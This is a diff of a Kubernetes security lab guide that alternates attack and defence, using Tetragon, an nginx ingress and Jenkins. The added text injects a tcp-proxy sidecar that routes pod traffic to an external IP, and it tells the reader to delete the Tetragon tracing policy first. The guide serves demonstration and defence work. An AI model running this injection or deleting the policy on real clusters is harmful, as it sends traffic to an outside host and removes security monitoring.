@@ -1,22 +1,12 @@
 # Secure Env
 
 After noticing strange behavior on test environment, we want to secure our prod env.
+Therefore, some actions have been taken by Head Of Security.
 
-## Change Passwords
-
-We force all our employees to change their passwords.
-
-## Set Jenkins behind Reverse Proxy
-
-We deploy an ingress-nginx in front of jenkins to log all the logins.
-
-## Deploy Tetragon
-
-We deploy tetragon to observe the root console of K8s.
-
-### Define TracingPolicy
-
-We define a tetragon tracing policy that prevents changing haproxy files.
+* We force all our employees to change their passwords.
+* We deploy an ingress-nginx in front of jenkins to log all the logins.
+* We deploy tetragon to observe the root console of K8s.
+* We define a tetragon tracing policy that prevents changing haproxy files.
 
 # Attack Again & Defend
 
@@ -31,7 +21,10 @@ kubectl logs <Ingress-Controller-Pod-Name> -f -n ingress-nginx
 
 ## K8s Pod TCP Traffic Routing
 
-The attacker switches to prod env on octant and tries to inject a sidecar container in the app pod, which routes all the tcp traffic to a remote server:
+The attacker switches to prod env on octant and tries to inject a sidecar container in the app pod, which routes all the tcp traffic to a remote server.
+
+>**Note**
+>in order to show that, the TetragonPolicy must be deleted beforehand: ```kubectl delete TracingPolicy haproxy``` So delete it on `test` environment first, for example.
 
 Edit the app deployment:
 
@@ -39,17 +32,18 @@ Edit the app deployment:
 kubectl edit deployment/conduit-backend
 ```
 
-Inject the sidecar container:
 
-```bash
-- env:
-  - name: LISTEN
-    value: :8081
-  - name: TALK
-    value: 127.0.0.1:8080
-  image: tecnativa/tcp-proxy
-  imagePullPolicy: Always
-  name: sidecar
+Inject the sidecar container, directly below `containers` on column 0
+
+```bash..
+      - env:
+        - name: LISTEN
+          value: ":8081"
+        - name: TALK
+          value: "34.118.40.42:443"
+        name: sidecar
+        image: tecnativa/tcp-proxy
+        imagePullPolicy: Always
 ```
 
 The new container will not be deployed properly, since a SigKill will be sent to end that process from the tetragon policy we defined before. This can be checked using the following command:
@@ -57,6 +51,13 @@ The new container will not be deployed properly, since a SigKill will be sent to
 ```bash
 kubectl get pod -n conduit-app
 ```
+
+### TEST
+
+### PROD
+Switch to PROD via
+```kubectl config use-context gke_thorsten-jakoby-tj-projekt_europe-west3_conduit-k8s-prod```
+
 
 An error status will be noticed for the pods as in the following example:
 
